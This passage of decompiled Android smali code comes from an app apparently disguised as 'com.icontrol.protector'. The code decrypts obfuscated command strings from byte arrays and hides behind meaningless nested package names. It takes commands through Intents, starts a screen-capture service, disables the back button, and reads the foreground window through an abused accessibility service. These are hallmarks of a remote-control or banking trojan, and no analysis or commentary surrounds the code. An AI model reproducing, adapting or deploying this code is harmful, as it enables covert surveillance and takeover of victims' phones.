    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void

    :array_0
    .array-data 1
        0x60t
        -0x1bt
        -0x1at
        0x7ct
        0x49t
        0x3at
        -0x58t
        -0x2ft
        0x62t
        -0x16t
        -0x19t
        0x76t
        0x5ct
        0xct
        -0x49t
        -0x33t
    .end array-data

    :array_1
    .array-data 1
        0xdt
        -0x80t
        -0x7et
        0x15t
        0x28t
        0x65t
        -0x28t
        -0x5dt
    .end array-data
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/16 v0, 0x64

    if-ne p1, v0, :cond_0

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    sput-object p3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->l:Landroid/content/Intent;

    sput p2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->m:I

    sget p1, Lcom/icontrol/protector/ActivityCaptureScreen;->b:I

    invoke-static {p0, p2, p3, p1}, Lcom/icontrol/protector/ScreenCaps;->s(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_0
    return-void
.end method

.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 7

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const/4 v0, 0x3

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->a:Ljava/lang/String;

    invoke-static {v2}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const/4 p1, 0x0

    :goto_0
    if-nez p1, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_0
    const/4 v2, 0x0

    aget-object v3, p1, v2

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v5, 0x9df

    const/4 v6, 0x1

    if-eq v4, v5, :cond_2

    const v2, 0x1314f

    if-eq v4, v2, :cond_1

    goto :goto_1

    :cond_1
    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    move v2, v6

    goto :goto_2

    :cond_2
    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    goto :goto_2

    :cond_3
    :goto_1
    const/4 v2, -0x1

    :goto_2
    if-eqz v2, :cond_5

    if-eq v2, v6, :cond_4

    goto :goto_3

    :cond_4
    const/4 p1, 0x5

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array v0, v1, [B

    fill-array-data v0, :array_7

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/icontrol/protector/AccessServices;->W:Ljava/lang/String;

    invoke-direct {p0}, Lcom/icontrol/protector/ActivityCaptureScreen;->a()V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto :goto_3

    :cond_5
    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v1, v1, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/AccessServices;->W:Ljava/lang/String;

    aget-object p1, p1, v6

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    sput p1, Lcom/icontrol/protector/ActivityCaptureScreen;->b:I

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->l:Landroid/content/Intent;

    if-eqz p1, :cond_6

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->m:I

    const/16 v0, -0x3e7

    if-eq p1, v0, :cond_6

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x22

    if-ge p1, v0, :cond_6

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->m:I

    sget-object v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->l:Landroid/content/Intent;

    sget v1, Lcom/icontrol/protector/ActivityCaptureScreen;->b:I

    invoke-static {p0, p1, v0, v1}, Lcom/icontrol/protector/ScreenCaps;->s(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_6
    invoke-direct {p0}, Lcom/icontrol/protector/ActivityCaptureScreen;->f()V

    const-wide/16 v0, 0x320

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    invoke-static {}, Lcom/icontrol/protector/ActivityCaptureScreen;->d()Lcom/icontrol/protector/AccessServices;

    move-result-object p1

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-eqz p1, :cond_7

    :try_start_2
    invoke-static {p1}, Lcom/icontrol/protector/ActivityCaptureScreen;->b(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_3

    :catch_2
    move-exception p1

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :cond_7
    :goto_3
    return-void

    :array_0
    .array-data 1
        -0x69t
        -0x28t
        0x3t
    .end array-data

    :array_1
    .array-data 1
        -0x2ct
        -0x69t
        0x4et
        0x38t
        -0x9t
        0x26t
        0x30t
        -0x18t
    .end array-data

    :array_2
    .array-data 1
        0x58t
        -0x57t
        -0x5ct
    .end array-data

    :array_3
    .array-data 1
        0x17t
        -0x11t
        -0x1et
        -0x19t
        0x6bt
        0x1at
        0x10t
        0xct
    .end array-data

    :array_4
    .array-data 1
        -0x3et
        -0x6bt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x73t
        -0x25t
        0x4dt
        -0x1t
        -0x2t
        -0x11t
        -0x34t
        -0x5ct
    .end array-data

    :array_6
    .array-data 1
        -0x18t
        -0x54t
        0x6dt
        -0x61t
        -0x54t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x72t
        -0x33t
        0x1t
        -0x14t
        -0x37t
        0x3bt
        0x2ft
        -0xft
    .end array-data

    :array_8
    .array-data 1
        -0x7ct
        -0x62t
        0x2at
        -0x5et
    .end array-data

    :array_9
    .array-data 1
        -0x10t
        -0x14t
        0x5ft
        -0x39t
        0x2ft
        0xft
        0x3ct
        -0x4t
    .end array-data
.end method
